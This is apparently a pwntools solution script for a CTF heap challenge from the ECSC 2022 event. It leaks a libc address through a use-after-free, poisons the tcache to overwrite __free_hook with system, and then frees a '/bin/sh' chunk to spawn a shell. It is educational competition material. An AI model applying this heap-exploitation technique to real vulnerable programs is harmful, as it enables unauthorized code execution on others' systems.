from pwn import *

elf = ELF('chall')
context.arch = elf.arch
context.binary = elf

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "b *0x400e15",
			# "b *0x4010b4",
			# "b *0x400ed2",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("heroes.ecsc22.hack.cert.pl", 18002)
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
cl = lambda: p.clean()

# OFFSET = p64(elf.symbols['win']) * 0x100

def alloc(size):
	print(f"Recruit {size}")
	sla(b'Your turn. What do you want to do? ', b'1')
	sla(b'Size of unit stack: ', str(size).encode())
	print(cl())

def free(idx):
	print(f"Disband {idx}")
	sla(b'Your turn. What do you want to do? ', b'2')
	sla(b'Position of unit: ', str(idx).encode())
	print(cl())

def inspect(idx):
	print(f"Inspect {idx}")
	sla(b'Your turn. What do you want to do? ', b'3')
	sla(b'Position of unit: ', str(idx).encode())
	data = cl()
	print(data)
	return data

def hire(idx, content):
	print(f"Hire {idx} {content}")
	sla(b'Your turn. What do you want to do? ', b'4')
	sla(b'Position of unit: ', str(idx).encode())
	sl(content)
	print(cl())

alloc(0x100)
alloc(0x10)
hire(1, b'/bin/sh')

for _ in range(7):
	alloc(0x100)

for i in range(2, 10):
	free(i)

free(0)

libc_leak = inspect(0)
libc_leak = libc_leak[:libc_leak.find(b'Current player is orange.')].strip(b'OK\n')
libc_leak = u64(libc_leak.ljust(8, b'\x00'))

li(f'Leak libc {hex(libc_leak)}')
libc_base = libc_leak - 0x3ebca0
li(f'libc base {hex(libc_base)}')

libc = ELF('./libc.so.6')
libc.address = libc_base
free_hook = libc.symbols['__free_hook']
li(f"Free hook: {hex(free_hook)}")

hire(8, p64(free_hook))

alloc(0x100)

alloc(0x100)
pause()
hire(10, p64(libc.symbols['system']))
free(1)

ia()
